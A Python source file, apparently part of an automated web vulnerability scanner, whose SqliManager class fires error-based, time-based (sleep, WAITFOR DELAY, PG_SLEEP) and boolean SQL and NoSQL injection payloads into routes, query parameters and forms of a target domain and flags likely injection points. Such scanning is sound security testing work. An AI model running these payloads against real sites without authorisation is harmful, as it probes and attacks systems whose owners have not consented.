import inject
import urllib
import urllib.parse as urlparse

from copy import deepcopy
from datetime import datetime
from typing import List
from Common.Logger import Logger
from Common.RequestChecker import RequestChecker
from Common.RequestHandler import RequestHandler
from Common.ThreadManager import ThreadManager
from Helpers.CacheHelper import CacheHelper
from Models.FormRequestDTO import FormRequestDTO
from Models.HeadRequestDTO import HeadRequestDTO
from Models.InjectionFoundDTO import InjectionType, InjectionFoundDTO


class SqliManager:
    def __init__(self):

        self._result: List[InjectionFoundDTO] = []
        self._false_positives = ['malformed request syntax',
                                 'instanceof syntaxerror',
                                 'script tag to avoid syntax errors',
                                 'eval|internal|range|reference|syntax|type']
        self._error_based_payloads = ['\'', '\\', '"', '%27', '%5C', '%2F']
        self._time_based_payloads = [
            {'TruePld': '\'OR(if(1=1,sleep(5),0))OR\'', 'FalsePld': '\'OR(if(1=2,sleep(5),0))OR\'',
             'True2Pld': '\'OR(if(2=2,sleep(5),0))OR\'', 'False2Pld': '\'OR(if(1=3,sleep(5),0))OR\''},
            {'TruePld': '"OR(if(1=1,sleep(5),0))OR"', 'FalsePld': '"OR(if(1=2,sleep(5),0))OR"',
             'True2Pld': '"OR(if(2=2,sleep(5),0))OR"', 'False2Pld': '"OR(if(1=3,sleep(5),0))OR"'},
            {'TruePld': '1\'; WAITFOR DELAY \'00:00:05', 'FalsePld': '1\'; WAITFOR DELAY \'00:00:00',
             'True2Pld': '1\'; WAITFOR DELAY \'00:00:08', 'False2Pld': '2\'; WAITFOR DELAY \'00:00:00'},
            {'TruePld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(5)) OR \'',
             'FalsePld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(0)) OR \'',
             'True2Pld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(6)) OR \'',
             'False2Pld': '\' OR \'1\'>(SELECT \'2\' FROM PG_SLEEP(0)) OR \''},
        ]
        self._bool_based_payloads = [
            {'TruePld': '\'OR(1=1)OR\'', 'FalsePld': '\'OR(1=2)OR\'', 'True2Pld': '\'OR(2=2)OR\'',
             'False2Pld': '\'OR(1=3)OR\'', 'True3Pld': '\'OR(3=3)OR\''},
            {'TruePld': '{$ne:null}', 'FalsePld': '{$eq:null}',
             'True2Pld': '{$ne:55555555}', 'False2Pld': '{$eq:55555555}',
             'True3Pld': '{$ne:66666666}', 'False3Pld': '{$eq:66666666}'},
            {'TruePld': '"OR(1=1)OR"', 'FalsePld': '"OR(1=2)OR"', 'True2Pld': '"OR(2=2)OR"',
             'False2Pld': '"OR(1=3)OR"', 'True3Pld': '"OR(3=3)OR"'},
            {'TruePld': '\'|| \'1\'==\'1', 'FalsePld': '\'|| \'1\'==\'2', 'True2Pld': '\'|| \'2\'==\'2',
             'False2Pld': '\'|| \'1\'==\'3', 'True3Pld': '\'|| \'3\'==\'3'}
        ]
        self._bool_diff_rate = 0.05
        self._delay_in_seconds = 5
        self._injections_to_check = [' syntax', 'ODBC SQL Server Driver', 'internalerror', 'exception: ']
        self.errors_500 = []

        self._thread_manager = inject.instance(ThreadManager)
        self._logger = inject.instance(Logger)
        self._request_checker = inject.instance(RequestChecker)
        self._request_handler = inject.instance(RequestHandler)

    def check_get_requests(self, domain: str, dtos: List[HeadRequestDTO]):

        cache_manager = CacheHelper('SqliManager/Get', domain, 'Results')
        self._result = cache_manager.get_saved_result()

        if self._result is None:
            self._result: List[InjectionFoundDTO] = []

            self._thread_manager.run_all(self.__check_url, dtos, debug_msg=f'SqliManager/Get/Route ({domain})')

            dtos_with_params = {}
            for dto in dtos:
                if ";".join(dto.query_params) not in dtos_with_params and len(dto.query_params) > 0:
                    dtos_with_params[";".join(dto.query_params)] = dto

            self._thread_manager.run_all(self.__check_get_params, list(dtos_with_params.values()),
                                         debug_msg=f'SqliManager/Get/Params ({domain})')

            cache_manager.save_dtos(self._result)

        self._logger.log_warn(f'({domain}) SqliManager GET found {len(self._result)} items')

    def check_form_requests(self, domain: str, form_dtos: List[FormRequestDTO]):

        cache_manager = CacheHelper('SqliManager/Form', domain, 'Results')
        self._result = cache_manager.get_saved_result()

        if self._result is None:
            self._result: List[InjectionFoundDTO] = []

            self._thread_manager.run_all(self.__check_form, form_dtos, debug_msg=f'SqliManager/Form ({domain})')

            cache_manager.save_dtos(self._result)

        self._logger.log_warn(f'({domain}) Found FORM SQLi: {len(self._result)}')

    def __check_form(self, dto: FormRequestDTO):
        for form in dto.form_params:

            if any('csrf' in param.lower() for param in form.params):
                continue

            if form.method_type == "POST":
                for param in form.params:

                    if self._request_checker.is_form_param_checked(form.method_type, dto.url, param):
                        continue

                    copy_form_params = deepcopy(form.params)
                    prev_param = copy_form_params[param]
                    for payload in self._error_based_payloads:
                        copy_form_params[param] = payload

                        response = self._request_handler.handle_request(dto.url, post_data=copy_form_params)
                        if response is None:
                            copy_form_params[param] = prev_param
                            break

                        need_to_discard_payload = self.__check_keywords(response,
                                                                        dto.url,
                                                                        InjectionType.Sqli_PostForm_Error,
                                                                        post_payload=copy_form_params,
                                                                        original_post_params=form.params)

                        if need_to_discard_payload:
                            copy_form_params[param] = prev_param
                    for payloads in self._time_based_payloads:
                        self.__send_form_time_based(payloads, form.params, param, dto.url)
                    for payloads in self._bool_based_payloads:
                        self.__send_bool_based_request(payloads, dto.url, form.params, param)

            elif form.method_type == "GET":
                parsed = urlparse.urlparse(dto.url)
                url_ending = len(form.action) * -1
                if form.action.startswith('http'):
                    url = f'{form.action}?'
                elif len(parsed.path) >= len(form.action) and str(parsed.path)[url_ending:] == form.action:
                    url = f'{parsed.scheme}://{parsed.netloc}{parsed.path}?'
                else:
                    url = f'{parsed.scheme}://{parsed.netloc}/{form.action}?'

                for param in form.params:

                    if self._request_checker.is_form_param_checked(form.method_type, dto.url, param):
                        continue

                    for payload in self._error_based_payloads:
                        prev_url = url
                        url += f'{param}={payload}&'

                        response = self._request_handler.handle_request(url)
                        if response is None:
                            continue

                        self.__check_keywords(response,
                                              url,
                                              InjectionType.Sqli_Get_Error,
                                              original_url=dto.url)

                        url = prev_url
            else:
                self._logger.log_warn("METHOD TYPE NOT FOUND: " + form.method_type)
                return

    def __get_route_payloads(self, url: str, injections: [], salt) -> []:

        parsed = urllib.parse.urlparse(url)
        route_parts = [r for r in parsed.path.split('/') if r.strip()]
        result = []
        for index, part in enumerate(route_parts):

            if self._request_checker.is_route_checked(url, part, salt, check_specific_type=True):
                continue

            for payloads in injections:
                payload_part = f'{part}{payloads["TruePld"]}'
                new_route_parts = deepcopy(route_parts)
                new_route_parts[index] = payload_part
                true_new_url = f'{parsed.scheme}://{parsed.netloc}/{"/".join(new_route_parts)}?{parsed.query}'

                payload_part = f'{part}{payloads["FalsePld"]}'
                new_route_parts = deepcopy(route_parts)
                new_route_parts[index] = payload_part
                false_new_url = f'{parsed.scheme}://{parsed.netloc}/{"/".join(new_route_parts)}?{parsed.query}'

                payload_part = f'{part}{payloads["True2Pld"]}'
                new_route_parts = deepcopy(route_parts)
                new_route_parts[index] = payload_part
                true2_new_url = f'{parsed.scheme}://{parsed.netloc}/{"/".join(new_route_parts)}?{parsed.query}'

                payload_part = f'{part}{payloads["False2Pld"]}'
                new_route_parts = deepcopy(route_parts)
                new_route_parts[index] = payload_part
                false2_new_url = f'{parsed.scheme}://{parsed.netloc}/{"/".join(new_route_parts)}?{parsed.query}'

                result.append({'TruePld': true_new_url, 'FalsePld': false_new_url,
                               'True2Pld': true2_new_url, 'False2Pld': false2_new_url})

        return result

    def __check_url(self, dto: HeadRequestDTO):

        route_url_payloads = self._request_checker.get_route_payloads(dto.url, self._error_based_payloads, 'SqliE',
                                                                      check_specific_type=True)
        route_time_based_payloads = self.__get_route_payloads(dto.url, self._time_based_payloads, 'SqliT')
        route_bool_based_payloads = self.__get_route_payloads(dto.url, self._bool_based_payloads, 'SqliB')

        for url in route_url_payloads:
            self.__send_error_based_request(url, dto)

        for payloads in route_time_based_payloads:
            self.__send_time_based_request(payloads['TruePld'], payloads['FalsePld'], payloads['True2Pld'])

        for payloads in route_bool_based_payloads:
            self.__send_bool_based_request(payloads)

    def __get_param_payloads(self, url: str, injections: [], salt) -> []:
        payloads_urls = []
        parsed = urlparse.urlparse(url)
        params_key_values = filter(None, parsed.query.split("&"))

        for param_k_v in params_key_values:

            if self._request_checker.is_get_param_checked(url, param_k_v, salt):
                continue

            param_split = param_k_v.split('=')
            main_url_split = url.split(param_k_v)
            for payloads in injections:
                if len(payloads.keys()) == 3:
                    payloads_urls.append({
                        'TruePld': f'{main_url_split[0]}{param_split[0]}={payloads["TruePld"]}{main_url_split[1]}',
                        'FalsePld': f'{main_url_split[0]}{param_split[0]}={payloads["FalsePld"]}{main_url_split[1]}',
                        'True2Pld': f'{main_url_split[0]}{param_split[0]}={payloads["True2Pld"]}{main_url_split[1]}'})
                elif len(payloads.keys()) == 5:
                    payloads_urls.append({
                        'TruePld': f'{main_url_split[0]}{param_split[0]}={payloads["TruePld"]}{main_url_split[1]}',
                        'FalsePld': f'{main_url_split[0]}{param_split[0]}={payloads["FalsePld"]}{main_url_split[1]}',
                        'True2Pld': f'{main_url_split[0]}{param_split[0]}={payloads["True2Pld"]}{main_url_split[1]}',
                        'False2Pld': f'{main_url_split[0]}{param_split[0]}={payloads["False2Pld"]}{main_url_split[1]}',
                        'True3Pld': f'{main_url_split[0]}{param_split[0]}={payloads["True3Pld"]}{main_url_split[1]}'})

        return payloads_urls

    def __check_get_params(self, dto: HeadRequestDTO):

        error_based_payloads_urls = self._request_checker.get_param_payloads(
            dto.url, self._error_based_payloads, 'SqliE')
        time_based_payloads_urls = self.__get_param_payloads(dto.url, self._time_based_payloads, 'SqliT')
        bool_based_payloads_urls = self.__get_param_payloads(dto.url, self._bool_based_payloads, 'SqliB')

        for payload in error_based_payloads_urls:
            self.__send_error_based_request(payload, dto)

        for payloads in time_based_payloads_urls:
            self.__send_time_based_request(payloads['TruePld'], payloads['FalsePld'], payloads['True2Pld'])

        for payloads in bool_based_payloads_urls:
            self.__send_bool_based_request(payloads)

    def __send_error_based_request(self, url: str, dto: HeadRequestDTO):
        try:
            response = self._request_handler.handle_request(url)
            if response is None:
                return

            self.__check_keywords(response, url, InjectionType.Sqli_Get_Error, original_url=dto.url)

        except Exception as inst:
            self._logger.log_error(f"Exception - ({url}) - {inst}")

    def __send_bool_based_request(self, payloads, url=None, form_params=None, param=None):
        if url:
            copy_form_params = deepcopy(form_params)
            copy_form_params[param] = payloads["TruePld"]
            true_response = self._request_handler.handle_request(url, post_data=copy_form_params)
        else:
            true_response = self._request_handler.handle_request(payloads["TruePld"])

        if not true_response:
            return

        true_status = true_response.status_code
        if true_status == 403 or true_status == 429:
            return

        true_length = len(true_response.text)
        if true_length == 0:
            true_length = 1

        if url:
            copy_form_params = deepcopy(form_params)
            copy_form_params[param] = payloads["FalsePld"]
            false_response = self._request_handler.handle_request(url, post_data=copy_form_params)
        else:
            false_response = self._request_handler.handle_request(payloads["FalsePld"])

        if not false_response:
            return
        false_status = false_response.status_code
        false_length = len(false_response.text)
        if false_length == 0:
            false_length = 1

        if false_status == 403 or false_status == 429:
            return

        if abs(true_length - false_length) / true_length > self._bool_diff_rate and false_length != true_length:

            if url:
                copy_form_params = deepcopy(form_params)
                copy_form_params[param] = payloads["True2Pld"]
                true2_response = self._request_handler.handle_request(url, post_data=copy_form_params)
            else:
                true2_response = self._request_handler.handle_request(payloads["True2Pld"])

            true2_length = len(true2_response.text)
            true2_status = true2_response.status_code

            if true2_length == 0:
                true2_length = 1

            if true2_status == 403 or true2_status == 429:
                return

            if abs(true_length - true2_length) / true_length < self._bool_diff_rate or true_length == true2_length:

                if url:
                    copy_form_params = deepcopy(form_params)
                    copy_form_params[param] = payloads["False2Pld"]
                    false2_response = self._request_handler.handle_request(url, post_data=copy_form_params)
                else:
                    false2_response = self._request_handler.handle_request(payloads["False2Pld"])

                false2_status = false2_response.status_code
                false2_length = len(false2_response.text)
                if false2_length == 0:
                    false2_length = 1

                if false2_status == 403 or false2_status == 429:
                    return

                if (abs(true2_length - false2_length) / true2_length > self._bool_diff_rate
                        and true2_length != false2_status):

                    msg_payload = 'BOOL_BASED'
                    if url:
                        copy_form_params = deepcopy(form_params)
                        copy_form_params[param] = payloads["True3Pld"]
                        true3_response = self._request_handler.handle_request(url, post_data=copy_form_params)
                        msg_payload = str(copy_form_params)
                    else:
                        true3_response = self._request_handler.handle_request(payloads["True3Pld"])

                    true3_length = len(true3_response.text)
                    true3_status = true3_response.status_code

                    if true3_length == 0:
                        true3_length = 1

                    if true3_status == 403 or true3_status == 429:
                        return

                    if (abs(true2_length - true3_length) / true2_length < self._bool_diff_rate or
                            true2_length == true3_length):
                        msg = f"SQLiManager bool PARAM length! TRUE:{payloads['TruePld']}; FALSE:{payloads['FalsePld']}"
                        if not any(dto.response_length == len(true2_response.text) and dto.details_msg == msg
                                   for dto in self._result):
                            self._logger.log_warn(msg)
                            self._result.append(InjectionFoundDTO(InjectionType.Sqli_Get_Bool,
                                                                  url or payloads["TruePld"],
                                                                  msg_payload, 'RESPONSE1 is NONE', msg))
        if true_status != false_status:
            msg_payload = 'BOOL_BASED'
            if url:
                copy_form_params = deepcopy(form_params)
                copy_form_params[param] = payloads["True2Pld"]
                true2_response = self._request_handler.handle_request(url, post_data=copy_form_params)
                msg_payload = str(copy_form_params)
            else:
                true2_response = self._request_handler.handle_request(payloads["True2Pld"])

            true2_status = true2_response.status_code
            if true_status == true2_status:
                msg = f"SQLiManager bool PARAM status_code! TRUE:{payloads['TruePld']} ; FALSE:{payloads['FalsePld']}"
                if not any(dto.response_length == len(true2_response.text) and dto.details_msg == msg
                           for dto in self._result):
                    self._logger.log_warn(msg)
                    self._result.append(InjectionFoundDTO(InjectionType.Sqli_Get_Bool, url or payloads["TruePld"],
                                                          msg_payload, 'RESPONSE1 is NONE', msg))

    def __send_time_based_request(self, true_payload, false_payload, true_2payload):
        t1 = datetime.now()
        self._request_handler.handle_request(true_payload)
        t2 = datetime.now() - t1
        if t2.total_seconds() >= self._delay_in_seconds:
            t1 = datetime.now()
            self._request_handler.handle_request(false_payload)
            t2 = datetime.now() - t1
            if t2.total_seconds() < self._delay_in_seconds:
                t1 = datetime.now()
                self._request_handler.handle_request(true_2payload)
                t2 = datetime.now() - t1
                if t2.total_seconds() >= self._delay_in_seconds:
                    t1 = datetime.now()
                    self._request_handler.handle_request(false_payload)
                    t2 = datetime.now() - t1
                    if t2.total_seconds() < self._delay_in_seconds:
                        t1 = datetime.now()
                        self._request_handler.handle_request(true_payload)
                        t2 = datetime.now() - t1
                        if t2.total_seconds() >= self._delay_in_seconds:
                            log_header_msg = f"SQLiManager delay FOUND! TRUE:{true_payload} ; FALSE:{false_payload}"
                            if not any(dto.details_msg == log_header_msg for dto in self._result):
                                self._logger.log_warn(log_header_msg)
                                self._result.append(InjectionFoundDTO(
                                    InjectionType.Sqli_Get_Time, true_payload, 'TIME_BASED',
                                    'RESPONSE1 is NONE', log_header_msg))

    def __check_keywords(self, response, url_payload, inj_type: InjectionType,
                         post_payload=None,
                         original_url: str = None,
                         original_post_params=None):
        web_page = response.text.lower()
        need_to_discard_payload = False
        for keyword in self._injections_to_check:
            if keyword in web_page and not any(word in web_page for word in self._false_positives):

                if original_url is not None:
                    check_response = self._request_handler.handle_request(original_url)
                else:
                    check_response = self._request_handler.handle_request(url_payload, post_data=original_post_params)

                if check_response is None or keyword in check_response.text.lower():
                    return

                substr_index = web_page.find(keyword)
                start_index = substr_index - 50 if substr_index - 50 > 0 else 0
                last_index = substr_index + 50 if substr_index + 50 < len(web_page) else substr_index
                details = web_page[start_index:last_index].replace('/n', '').replace('/r', '').strip()
                log_header_msg = f'injFOUND: {keyword}; ' \
                                 f'URL: {url_payload}; ' \
                                 f'DETAILS: {details};'
                curr_resp_length = len(web_page)

                if not any(dto.response_length == curr_resp_length and dto.details_msg == log_header_msg
                           for dto in self._result):
                    self._logger.log_warn(log_header_msg)
                    self._result.append(
                        InjectionFoundDTO(inj_type, url_payload, post_payload, web_page, log_header_msg))
                else:
                    self._logger.log_warn("Duplicate FORM SQLi: - " + url_payload)

                need_to_discard_payload = True

        if response.status_code == 500:
            details = response.text[0:200].replace('\n', '').replace('\r', '').strip()
            self._logger.log_warn(f"SqliManager: 500 status - {url_payload}; DETAILS: {details}")
            need_to_discard_payload = True
            self.errors_500.append({'url': url_payload, 'response_len': len(response.text)})

        return need_to_discard_payload

    def __send_form_time_based(self, payloads, form_params, param, url):
        copy_form_params = deepcopy(form_params)
        copy_form_params[param] = payloads["TruePld"]
        t1 = datetime.now()
        self._request_handler.handle_request(url, post_data=copy_form_params)
        t2 = datetime.now() - t1
        if t2.total_seconds() >= self._delay_in_seconds:

            copy_form_params = deepcopy(form_params)
            copy_form_params[param] = payloads["FalsePld"]
            t1 = datetime.now()
            response2 = self._request_handler.handle_request(url, post_data=copy_form_params)
            t2 = datetime.now() - t1
            if t2.total_seconds() < self._delay_in_seconds:

                copy_form_params = deepcopy(form_params)
                copy_form_params[param] = payloads["True2Pld"]
                t1 = datetime.now()
                self._request_handler.handle_request(url, post_data=copy_form_params)
                t2 = datetime.now() - t1
                if t2.total_seconds() >= self._delay_in_seconds:

                    copy_form_params = deepcopy(form_params)
                    copy_form_params[param] = payloads["FalsePld"]
                    t1 = datetime.now()
                    self._request_handler.handle_request(url, post_data=copy_form_params)
                    t2 = datetime.now() - t1
                    if t2.total_seconds() < self._delay_in_seconds:

                        copy_form_params = deepcopy(form_params)
                        copy_form_params[param] = payloads["TruePld"]
                        t1 = datetime.now()
                        self._request_handler.handle_request(url, post_data=copy_form_params)
                        t2 = datetime.now() - t1
                        if t2.total_seconds() >= self._delay_in_seconds:
                            log_header_msg = (f"SqliManager FORM delay FOUND! TRUE:{payloads['TruePld']}; "
                                              f"FALSE:{payloads['FalsePld']}")
                            curr_resp_length = len(response2.text)
                            if not any(dto.response_length == curr_resp_length and dto.details_msg == log_header_msg
                                       for dto in self._result):
                                self._logger.log_warn(log_header_msg)
                                self._result.append(
                                    InjectionFoundDTO(InjectionType.Sqli_PostForm_Time, url, copy_form_params,
                                                      response2.text, log_header_msg))
